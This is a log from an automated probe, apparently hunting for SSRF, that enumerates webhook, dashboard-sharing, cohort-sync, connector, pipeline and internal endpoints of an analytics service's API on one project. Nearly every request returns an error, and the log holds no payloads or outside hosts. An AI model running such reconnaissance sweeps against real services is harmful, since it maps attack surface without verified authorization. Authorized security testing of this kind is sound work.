[19:02:24] SSRF-TRIGGER: G-webhook_history ADMIN GET /api/app/projects/4025923/webhook_history -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook_history"}
[19:02:25] SSRF-TRIGGER: G-webhooks/preview ADMIN GET /api/app/projects/4025923/webhooks/preview -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/preview"}
[19:02:25] SSRF-TRIGGER: G-webhooks/dispatch ADMIN GET /api/app/projects/4025923/webhooks/dispatch -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/dispatch"}
[19:02:26] SSRF-TRIGGER: G-webhooks/deliveries ADMIN GET /api/app/projects/4025923/webhooks/deliveries -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/deliveries"}
[19:02:27] SSRF-TRIGGER: G-webhooks/history ADMIN GET /api/app/projects/4025923/webhooks/history -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/history"}
[19:02:28] SSRF-TRIGGER: G-webhooks/logs ADMIN GET /api/app/projects/4025923/webhooks/logs -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/logs"}
[19:02:28] SSRF-TRIGGER: === H: any board/dashboard/report 'send'/'share via webhook' ===
[19:02:28] SSRF-TRIGGER: H-send ADMIN GET /api/app/projects/4025923/dashboards/11207838/send -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/send"}
[19:02:29] SSRF-TRIGGER: H-send-POST ADMIN POST /api/app/projects/4025923/dashboards/11207838/send -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/send"}
[19:02:29] SSRF-TRIGGER: H-share ADMIN GET /api/app/projects/4025923/dashboards/11207838/share -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/share"}
[19:02:30] SSRF-TRIGGER: H-share-POST ADMIN POST /api/app/projects/4025923/dashboards/11207838/share -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/share"}
[19:02:30] SSRF-TRIGGER: H-export ADMIN GET /api/app/projects/4025923/dashboards/11207838/export -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/export"}
[19:02:31] SSRF-TRIGGER: H-export-POST ADMIN POST /api/app/projects/4025923/dashboards/11207838/export -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/export"}
[19:02:31] SSRF-TRIGGER: H-subscribe ADMIN GET /api/app/projects/4025923/dashboards/11207838/subscribe -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/subscribe"}
[19:02:32] SSRF-TRIGGER: H-subscribe-POST ADMIN POST /api/app/projects/4025923/dashboards/11207838/subscribe -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/subscribe"}
[19:02:32] SSRF-TRIGGER: H-webhook ADMIN GET /api/app/projects/4025923/dashboards/11207838/webhook -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/webhook"}
[19:02:33] SSRF-TRIGGER: H-webhook-POST ADMIN POST /api/app/projects/4025923/dashboards/11207838/webhook -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/webhook"}
[19:02:34] SSRF-TRIGGER: H-email ADMIN GET /api/app/projects/4025923/dashboards/11207838/email -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/email"}
[19:02:34] SSRF-TRIGGER: H-email-POST ADMIN POST /api/app/projects/4025923/dashboards/11207838/email -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/dashboards/11207838/email"}
[19:02:35] SSRF-TRIGGER: H-subscriptions ADMIN GET /api/app/projects/4025923/subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/subscriptions"}
[19:02:35] SSRF-TRIGGER: H-subscriptions-POST ADMIN POST /api/app/projects/4025923/subscriptions -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/subscriptions"}
[19:02:35] SSRF-TRIGGER: H-board_alerts ADMIN GET /api/app/projects/4025923/board_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/board_alerts"}
[19:02:36] SSRF-TRIGGER: H-board_alerts-POST ADMIN POST /api/app/projects/4025923/board_alerts -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/board_alerts"}
[19:02:36] SSRF-TRIGGER: Saved /home/hunter/new_agent/results/mixpanel/ssrf-trigger-1780160503.json entries=93
[19:03:30] SSRF-TRIGGER: === A: /api/2.0/cohort_sync deep ===
[19:03:31] SSRF-TRIGGER: A-cohort_sync-GET GET /api/2.0/cohort_sync?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:31] SSRF-TRIGGER: A-cohort_sync-POST POST /api/2.0/cohort_sync?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:32] SSRF-TRIGGER: A-cohort_sync-OPTIONS OPTIONS /api/2.0/cohort_sync?project_id=4025923 -> 200 Allow= [*] | 
[19:03:32] SSRF-TRIGGER: A-cohort_sync/list-GET GET /api/2.0/cohort_sync/list?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/list?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:33] SSRF-TRIGGER: A-cohort_sync/list-POST POST /api/2.0/cohort_sync/list?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/list?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:33] SSRF-TRIGGER: A-cohort_sync/list-OPTIONS OPTIONS /api/2.0/cohort_sync/list?project_id=4025923 -> 200 Allow= [*] | 
[19:03:34] SSRF-TRIGGER: A-cohort_sync/create-GET GET /api/2.0/cohort_sync/create?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/create?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:34] SSRF-TRIGGER: A-cohort_sync/create-POST POST /api/2.0/cohort_sync/create?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/create?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:34] SSRF-TRIGGER: A-cohort_sync/create-OPTIONS OPTIONS /api/2.0/cohort_sync/create?project_id=4025923 -> 200 Allow= [*] | 
[19:03:35] SSRF-TRIGGER: A-cohort_sync/new-GET GET /api/2.0/cohort_sync/new?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/new?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:36] SSRF-TRIGGER: A-cohort_sync/new-POST POST /api/2.0/cohort_sync/new?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/new?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:36] SSRF-TRIGGER: A-cohort_sync/new-OPTIONS OPTIONS /api/2.0/cohort_sync/new?project_id=4025923 -> 200 Allow= [*] | 
[19:03:37] SSRF-TRIGGER: A-cohort_sync/save-GET GET /api/2.0/cohort_sync/save?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/save?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:37] SSRF-TRIGGER: A-cohort_sync/save-POST POST /api/2.0/cohort_sync/save?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/save?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:38] SSRF-TRIGGER: A-cohort_sync/save-OPTIONS OPTIONS /api/2.0/cohort_sync/save?project_id=4025923 -> 200 Allow= [*] | 
[19:03:38] SSRF-TRIGGER: A-cohort_sync/run-GET GET /api/2.0/cohort_sync/run?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/run?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:39] SSRF-TRIGGER: A-cohort_sync/run-POST POST /api/2.0/cohort_sync/run?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/run?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:39] SSRF-TRIGGER: A-cohort_sync/run-OPTIONS OPTIONS /api/2.0/cohort_sync/run?project_id=4025923 -> 200 Allow= [*] | 
[19:03:40] SSRF-TRIGGER: A-cohort_sync/sync-GET GET /api/2.0/cohort_sync/sync?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/sync?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:41] SSRF-TRIGGER: A-cohort_sync/sync-POST POST /api/2.0/cohort_sync/sync?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/sync?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:41] SSRF-TRIGGER: A-cohort_sync/sync-OPTIONS OPTIONS /api/2.0/cohort_sync/sync?project_id=4025923 -> 200 Allow= [*] | 
[19:03:42] SSRF-TRIGGER: A-cohort_sync/test-GET GET /api/2.0/cohort_sync/test?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/test?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:42] SSRF-TRIGGER: A-cohort_sync/test-POST POST /api/2.0/cohort_sync/test?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/test?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:43] SSRF-TRIGGER: A-cohort_sync/test-OPTIONS OPTIONS /api/2.0/cohort_sync/test?project_id=4025923 -> 200 Allow= [*] | 
[19:03:44] SSRF-TRIGGER: A-cohort_sync/preview-GET GET /api/2.0/cohort_sync/preview?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/preview?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:44] SSRF-TRIGGER: A-cohort_sync/preview-POST POST /api/2.0/cohort_sync/preview?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/preview?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:45] SSRF-TRIGGER: A-cohort_sync/preview-OPTIONS OPTIONS /api/2.0/cohort_sync/preview?project_id=4025923 -> 200 Allow= [*] | 
[19:03:45] SSRF-TRIGGER: A-cohort_sync/dispatch-GET GET /api/2.0/cohort_sync/dispatch?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/dispatch?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:46] SSRF-TRIGGER: A-cohort_sync/dispatch-POST POST /api/2.0/cohort_sync/dispatch?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/dispatch?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:46] SSRF-TRIGGER: A-cohort_sync/dispatch-OPTIONS OPTIONS /api/2.0/cohort_sync/dispatch?project_id=4025923 -> 200 Allow= [*] | 
[19:03:47] SSRF-TRIGGER: A-cohort_sync/fire-GET GET /api/2.0/cohort_sync/fire?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/fire?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:47] SSRF-TRIGGER: A-cohort_sync/fire-POST POST /api/2.0/cohort_sync/fire?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/fire?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:48] SSRF-TRIGGER: A-cohort_sync/fire-OPTIONS OPTIONS /api/2.0/cohort_sync/fire?project_id=4025923 -> 200 Allow= [*] | 
[19:03:48] SSRF-TRIGGER: A-cohort_sync/trigger-GET GET /api/2.0/cohort_sync/trigger?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/trigger?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:49] SSRF-TRIGGER: A-cohort_sync/trigger-POST POST /api/2.0/cohort_sync/trigger?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/trigger?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:49] SSRF-TRIGGER: A-cohort_sync/trigger-OPTIONS OPTIONS /api/2.0/cohort_sync/trigger?project_id=4025923 -> 200 Allow= [*] | 
[19:03:50] SSRF-TRIGGER: A-cohort_sync/update-GET GET /api/2.0/cohort_sync/update?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/update?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:50] SSRF-TRIGGER: A-cohort_sync/update-POST POST /api/2.0/cohort_sync/update?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/update?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:51] SSRF-TRIGGER: A-cohort_sync/update-OPTIONS OPTIONS /api/2.0/cohort_sync/update?project_id=4025923 -> 200 Allow= [*] | 
[19:03:51] SSRF-TRIGGER: A-cohort_sync/delete-GET GET /api/2.0/cohort_sync/delete?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/delete?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:52] SSRF-TRIGGER: A-cohort_sync/delete-POST POST /api/2.0/cohort_sync/delete?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/delete?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:53] SSRF-TRIGGER: A-cohort_sync/delete-OPTIONS OPTIONS /api/2.0/cohort_sync/delete?project_id=4025923 -> 200 Allow= [*] | 
[19:03:53] SSRF-TRIGGER: A-cohort_sync/destinations-GET GET /api/2.0/cohort_sync/destinations?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/destinations?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:54] SSRF-TRIGGER: A-cohort_sync/destinations-POST POST /api/2.0/cohort_sync/destinations?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/destinations?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:54] SSRF-TRIGGER: A-cohort_sync/destinations-OPTIONS OPTIONS /api/2.0/cohort_sync/destinations?project_id=4025923 -> 200 Allow= [*] | 
[19:03:55] SSRF-TRIGGER: A-cohort_sync/webhooks-GET GET /api/2.0/cohort_sync/webhooks?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/webhooks?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:55] SSRF-TRIGGER: A-cohort_sync/webhooks-POST POST /api/2.0/cohort_sync/webhooks?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/webhooks?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:56] SSRF-TRIGGER: A-cohort_sync/webhooks-OPTIONS OPTIONS /api/2.0/cohort_sync/webhooks?project_id=4025923 -> 200 Allow= [*] | 
[19:03:57] SSRF-TRIGGER: A-cohort_sync/integrations-GET GET /api/2.0/cohort_sync/integrations?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/integrations?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:57] SSRF-TRIGGER: A-cohort_sync/integrations-POST POST /api/2.0/cohort_sync/integrations?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/integrations?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:58] SSRF-TRIGGER: A-cohort_sync/integrations-OPTIONS OPTIONS /api/2.0/cohort_sync/integrations?project_id=4025923 -> 200 Allow= [*] | 
[19:03:58] SSRF-TRIGGER: A-cohort_sync/members-GET GET /api/2.0/cohort_sync/members?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/members?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:59] SSRF-TRIGGER: A-cohort_sync/members-POST POST /api/2.0/cohort_sync/members?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/cohort_sync/members?project_id=4025923", "error": "Invalid API endpoint"}
[19:03:59] SSRF-TRIGGER: A-cohort_sync/members-OPTIONS OPTIONS /api/2.0/cohort_sync/members?project_id=4025923 -> 200 Allow= [*] | 
[19:03:59] SSRF-TRIGGER: === B: connectors ===
[19:04:00] SSRF-TRIGGER: B-connectors-GET GET /api/app/projects/4025923/connectors -> 200 Allow= [*] | {"status": "ok", "results": {"url": null, "has_more": false, "data": []}}
[19:04:00] SSRF-TRIGGER: B-connectors-POST POST /api/app/projects/4025923/connectors -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:01] SSRF-TRIGGER: B-connectors-OPTIONS OPTIONS /api/app/projects/4025923/connectors -> 405 Allow=GET, POST | 
[19:04:01] SSRF-TRIGGER: B-connectors/new-GET GET /api/app/projects/4025923/connectors/new -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:02] SSRF-TRIGGER: B-connectors/new-POST POST /api/app/projects/4025923/connectors/new -> 405 Allow=GET, DELETE | 
[19:04:02] SSRF-TRIGGER: B-connectors/new-OPTIONS OPTIONS /api/app/projects/4025923/connectors/new -> 405 Allow=GET, DELETE | 
[19:04:03] SSRF-TRIGGER: B-connectors/list-GET GET /api/app/projects/4025923/connectors/list -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:03] SSRF-TRIGGER: B-connectors/list-POST POST /api/app/projects/4025923/connectors/list -> 405 Allow=GET, DELETE | 
[19:04:04] SSRF-TRIGGER: B-connectors/list-OPTIONS OPTIONS /api/app/projects/4025923/connectors/list -> 405 Allow=GET, DELETE | 
[19:04:04] SSRF-TRIGGER: B-connectors/create-GET GET /api/app/projects/4025923/connectors/create -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:05] SSRF-TRIGGER: B-connectors/create-POST POST /api/app/projects/4025923/connectors/create -> 405 Allow=GET, DELETE | 
[19:04:05] SSRF-TRIGGER: B-connectors/create-OPTIONS OPTIONS /api/app/projects/4025923/connectors/create -> 405 Allow=GET, DELETE | 
[19:04:06] SSRF-TRIGGER: B-connectors/types-GET GET /api/app/projects/4025923/connectors/types -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:06] SSRF-TRIGGER: B-connectors/types-POST POST /api/app/projects/4025923/connectors/types -> 405 Allow=GET, DELETE | 
[19:04:07] SSRF-TRIGGER: B-connectors/types-OPTIONS OPTIONS /api/app/projects/4025923/connectors/types -> 405 Allow=GET, DELETE | 
[19:04:07] SSRF-TRIGGER: B-connectors/templates-GET GET /api/app/projects/4025923/connectors/templates -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:08] SSRF-TRIGGER: B-connectors/templates-POST POST /api/app/projects/4025923/connectors/templates -> 405 Allow=GET, DELETE | 
[19:04:08] SSRF-TRIGGER: B-connectors/templates-OPTIONS OPTIONS /api/app/projects/4025923/connectors/templates -> 405 Allow=GET, DELETE | 
[19:04:09] SSRF-TRIGGER: B-connectors/webhook-GET GET /api/app/projects/4025923/connectors/webhook -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:10] SSRF-TRIGGER: B-connectors/webhook-POST POST /api/app/projects/4025923/connectors/webhook -> 405 Allow=GET, DELETE | 
[19:04:10] SSRF-TRIGGER: B-connectors/webhook-OPTIONS OPTIONS /api/app/projects/4025923/connectors/webhook -> 405 Allow=GET, DELETE | 
[19:04:11] SSRF-TRIGGER: B-connectors/webhooks-GET GET /api/app/projects/4025923/connectors/webhooks -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:11] SSRF-TRIGGER: B-connectors/webhooks-POST POST /api/app/projects/4025923/connectors/webhooks -> 405 Allow=GET, DELETE | 
[19:04:12] SSRF-TRIGGER: B-connectors/webhooks-OPTIONS OPTIONS /api/app/projects/4025923/connectors/webhooks -> 405 Allow=GET, DELETE | 
[19:04:12] SSRF-TRIGGER: B-connectors/test-GET GET /api/app/projects/4025923/connectors/test -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:13] SSRF-TRIGGER: B-connectors/test-POST POST /api/app/projects/4025923/connectors/test -> 405 Allow=GET, DELETE | 
[19:04:13] SSRF-TRIGGER: B-connectors/test-OPTIONS OPTIONS /api/app/projects/4025923/connectors/test -> 405 Allow=GET, DELETE | 
[19:04:14] SSRF-TRIGGER: B-connectors/preview-GET GET /api/app/projects/4025923/connectors/preview -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:14] SSRF-TRIGGER: B-connectors/preview-POST POST /api/app/projects/4025923/connectors/preview -> 405 Allow=GET, DELETE | 
[19:04:15] SSRF-TRIGGER: B-connectors/preview-OPTIONS OPTIONS /api/app/projects/4025923/connectors/preview -> 405 Allow=GET, DELETE | 
[19:04:15] SSRF-TRIGGER: B-connectors/run-GET GET /api/app/projects/4025923/connectors/run -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:16] SSRF-TRIGGER: B-connectors/run-POST POST /api/app/projects/4025923/connectors/run -> 405 Allow=GET, DELETE | 
[19:04:16] SSRF-TRIGGER: B-connectors/run-OPTIONS OPTIONS /api/app/projects/4025923/connectors/run -> 405 Allow=GET, DELETE | 
[19:04:17] SSRF-TRIGGER: B-connectors/sync-GET GET /api/app/projects/4025923/connectors/sync -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:17] SSRF-TRIGGER: B-connectors/sync-POST POST /api/app/projects/4025923/connectors/sync -> 405 Allow=GET, DELETE | 
[19:04:18] SSRF-TRIGGER: B-connectors/sync-OPTIONS OPTIONS /api/app/projects/4025923/connectors/sync -> 405 Allow=GET, DELETE | 
[19:04:18] SSRF-TRIGGER: B-connectors/trigger-GET GET /api/app/projects/4025923/connectors/trigger -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:19] SSRF-TRIGGER: B-connectors/trigger-POST POST /api/app/projects/4025923/connectors/trigger -> 405 Allow=GET, DELETE | 
[19:04:19] SSRF-TRIGGER: B-connectors/trigger-OPTIONS OPTIONS /api/app/projects/4025923/connectors/trigger -> 405 Allow=GET, DELETE | 
[19:04:24] SSRF-TRIGGER: B-connectors/dispatch-GET GET /api/app/projects/4025923/connectors/dispatch -> 500 Allow= [*] | {"status": "error", "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via http
[19:04:24] SSRF-TRIGGER: B-connectors/dispatch-POST POST /api/app/projects/4025923/connectors/dispatch -> 405 Allow=GET, DELETE | 
[19:04:25] SSRF-TRIGGER: B-connectors/dispatch-OPTIONS OPTIONS /api/app/projects/4025923/connectors/dispatch -> 405 Allow=GET, DELETE | 
[19:04:25] SSRF-TRIGGER: === C: /api/2.0/cohorts POST shape sweep ===
[19:04:25] SSRF-TRIGGER: C-cohorts-POST POST /api/2.0/cohorts -> 403 Allow= [*] | {"request": "/api/2.0/cohorts", "error": "Workspace does not belong to project"}
[19:04:26] SSRF-TRIGGER: C-cohorts-POST POST /api/2.0/cohorts -> 500 Allow= [*] | {"request": "/api/2.0/cohorts", "error": "An unknown error occurred."}
[19:04:27] SSRF-TRIGGER: C-cohorts-POST POST /api/2.0/cohorts -> 500 Allow= [*] | {"request": "/api/2.0/cohorts", "error": "An unknown error occurred."}
[19:04:27] SSRF-TRIGGER: C-cohorts-POST POST /api/2.0/cohorts -> 400 Allow= [*] | {"request": "/api/2.0/cohorts", "error": "Missing required parameter: params"}
[19:04:28] SSRF-TRIGGER: C-cohorts-POST POST /api/2.0/cohorts -> 400 Allow= [*] | {"request": "/api/2.0/cohorts", "error": "Missing required parameter: params"}
[19:04:28] SSRF-TRIGGER: === D: rpc/graphql/private API ===
[19:04:28] SSRF-TRIGGER: D-GET-/api/app/rpc GET /api/app/rpc -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/rpc"}
[19:04:29] SSRF-TRIGGER: D-POST-/api/app/rpc POST /api/app/rpc -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/rpc"}
[19:04:29] SSRF-TRIGGER: D-GET-/api/app/internal GET /api/app/internal -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/internal"}
[19:04:30] SSRF-TRIGGER: D-POST-/api/app/internal POST /api/app/internal -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/internal"}
[19:04:30] SSRF-TRIGGER: D-GET-/api/app/v2 GET /api/app/v2 -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/v2"}
[19:04:31] SSRF-TRIGGER: D-POST-/api/app/v2 POST /api/app/v2 -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/v2"}
[19:04:31] SSRF-TRIGGER: D-GET-/internal/api GET /internal/api -> 404 Allow= | <!-- KEEP IN SYNC w/ iron/common/widgets/404-screen -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR
[19:04:32] SSRF-TRIGGER: D-POST-/internal/api POST /internal/api -> 404 Allow= | <!-- KEEP IN SYNC w/ iron/common/widgets/404-screen -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR
[19:04:32] SSRF-TRIGGER: D-GET-.0/internal?project_id=4025923 GET /api/2.0/internal?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/internal?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:33] SSRF-TRIGGER: D-POST-.0/internal?project_id=4025923 POST /api/2.0/internal?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/internal?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:33] SSRF-TRIGGER: D-GET-/api/app/projects/4025923/rpc GET /api/app/projects/4025923/rpc -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/rpc"}
[19:04:34] SSRF-TRIGGER: D-POST-/api/app/projects/4025923/rpc POST /api/app/projects/4025923/rpc -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/rpc"}
[19:04:34] SSRF-TRIGGER: D-GET-i/app/projects/4025923/private GET /api/app/projects/4025923/private -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/private"}
[19:04:35] SSRF-TRIGGER: D-POST-i/app/projects/4025923/private POST /api/app/projects/4025923/private -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/private"}
[19:04:35] SSRF-TRIGGER: D-GET-/api/app/projects/4025923/v2 GET /api/app/projects/4025923/v2 -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/v2"}
[19:04:36] SSRF-TRIGGER: D-POST-/api/app/projects/4025923/v2 POST /api/app/projects/4025923/v2 -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/v2"}
[19:04:36] SSRF-TRIGGER: D-GET-p/projects/4025923/v2/webhooks GET /api/app/projects/4025923/v2/webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/v2/webhooks"}
[19:04:37] SSRF-TRIGGER: D-POST-p/projects/4025923/v2/webhooks POST /api/app/projects/4025923/v2/webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/v2/webhooks"}
[19:04:37] SSRF-TRIGGER: === E: data-pipelines docs path ===
[19:04:37] SSRF-TRIGGER: E-/api/2.0/pipelines GET /api/2.0/pipelines -> 400 Allow= [*] | {"request": "/api/2.0/pipelines", "error": "project_id is a required parameter"}
[19:04:38] SSRF-TRIGGER: E-0/pipelines?project_id=4025923 GET /api/2.0/pipelines?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/pipelines?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:38] SSRF-TRIGGER: E-elines/list?project_id=4025923 GET /api/2.0/pipelines/list?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/pipelines/list?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:39] SSRF-TRIGGER: E-estinations?project_id=4025923 GET /api/2.0/pipelines/destinations?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/pipelines/destinations?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:40] SSRF-TRIGGER: E-=2026-05-30&project_id=4025923 GET /api/2.0/export?from_date=2026-05-01&to_date=2026-05-30&project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/export?from_date=2026-05-01&to_date=2026-05-30&project_id=4025923", "error": "Invalid API endpoint"}
[19:04:40] SSRF-TRIGGER: E-a_pipelines?project_id=4025923 GET /api/2.0/data_pipelines?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/data_pipelines?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:41] SSRF-TRIGGER: E-2.0/exports?project_id=4025923 GET /api/2.0/exports?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/exports?project_id=4025923", "error": "Invalid API endpoint"}
[19:04:41] SSRF-TRIGGER: === F: alerts docs path ===
[19:04:41] SSRF-TRIGGER: F-alerts?project_id=4025923-GET GET /api/2.0/alerts?project_id=4025923 -> 400 Allow= [*] | {"request": "/api/2.0/alerts?project_id=4025923", "error": "Invalid API endpoint"}
